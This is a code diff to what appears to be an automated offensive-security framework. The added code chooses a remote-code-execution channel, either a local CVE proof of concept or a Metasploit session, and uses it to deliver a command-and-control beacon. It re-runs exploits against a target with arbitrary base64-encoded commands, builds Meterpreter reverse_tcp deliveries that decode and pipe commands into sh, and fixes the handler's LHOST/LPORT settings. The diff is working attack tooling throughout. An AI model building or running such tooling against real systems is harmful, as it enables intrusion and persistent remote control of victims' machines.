@@ -2869,6 +2869,21 @@ def _pick_rce_candidate(wm: WorldModel) -> Optional[Dict[str, Any]]:
             _h, port = _web_service_target(wm)
             return {"channel": "web_upload", "port": port,
                     "evidence": v.get("evidence") or ""}
+        # A foothold verified by a local PoC (channel=poc) or by a real
+        # Meterpreter/shell session (channel=msf) is a first-class delivery
+        # channel. Before this, only the ORIGINAL exploit_plan was read, so
+        # a confirmed RCE could never feed beacon_via_rce.
+        ch = str(v.get("channel") or "").strip().lower()
+        if ch in ("poc", "msf") and v.get("cve"):
+            cand = {"channel": ch, "port": str(v.get("port") or ""),
+                    "cve": str(v.get("cve") or ""),
+                    "msf_module": str(v.get("msf_module") or ""),
+                    "evidence": v.get("evidence") or ""}
+            if ch == "msf" and not cand["msf_module"]:
+                # fall through to the exploit_plan entry below, which
+                # carries the module path
+                continue
+            return cand
     for f in wm.find("exploit_plan"):
         v = f.value if isinstance(f.value, dict) else {}
         if str(v.get("kind", "")).lower() != "rce":
@@ -3121,6 +3136,29 @@ def _beacon_via_rce_adapter(wm, slots):
         target = _effective_target(wm)
         return (f"curl -m 25 -s 'http://{target}:{cand['port']}{endpoint}' "
                 "-o /dev/null && echo PHANTOM_RCE_DELIVERED")
+    if cand["channel"] == "poc":
+        # A local PoC already proved command execution against this exact
+        # target. Re-run it with an arbitrary command and let the runner
+        # report success only if the command's output came back.
+        import base64
+        import shlex
+        import subprocess
+        import sys
+        cve = str(cand.get("cve") or "")
+        if not cve:
+            raise ValueError("local-PoC channel without CVE")
+        target = _effective_target(wm)
+        b64 = base64.b64encode(beacon_cmd.encode()).decode()
+        if os.name == "nt":
+            q = lambda value: subprocess.list2cmdline([str(value)])
+        else:
+            q = shlex.quote
+        return (
+            f"{q(sys.executable)} -m phantom.automation.exploit.poc_runner "
+            f"--cve {q(cve)} --target {q(target)} "
+            f"--port {q(cand.get('port') or '')} --command-b64 {q(b64)} "
+            "--require-rce && echo PHANTOM_RCE_DELIVERED"
+        )
     if cand["channel"] == "msf":
         return _msf_beacon_delivery(wm, cand, beacon_cmd)
     raise ValueError(f"beacon injection over channel "
@@ -3142,8 +3180,13 @@ def _msf_beacon_delivery(wm, cand, beacon_cmd):
                if "windows" in os_name
                else "linux/x64/meterpreter/reverse_tcp")
     from phantom.utils import config as cfg
-    lhost = str(cfg.get("c2.host", "127.0.0.1", env="PHANTOM_C2_HOST"))
-    lport = cfg.get_int("c2.port", 8080, env="PHANTOM_C2_PORT")
+    lhost = str(cfg.get("exploit.lhost", "",
+                        env="PHANTOM_EXPLOIT_LHOST")
+                or cfg.get("c2.host", "127.0.0.1", env="PHANTOM_C2_HOST"))
+    # LPORT is the Metasploit handler, NOT the C2 listener: reusing
+    # c2.port made the handler fail to bind (the beacon listener owns it).
+    lport = cfg.get_int("exploit.lport", 4444,
+                        env="PHANTOM_EXPLOIT_LPORT")
     b64 = base64.b64encode(beacon_cmd.encode()).decode()
     exec_cmd = f"echo {b64} | base64 -d | sh"
     rport = f"; set RPORT {port}" if port else ""
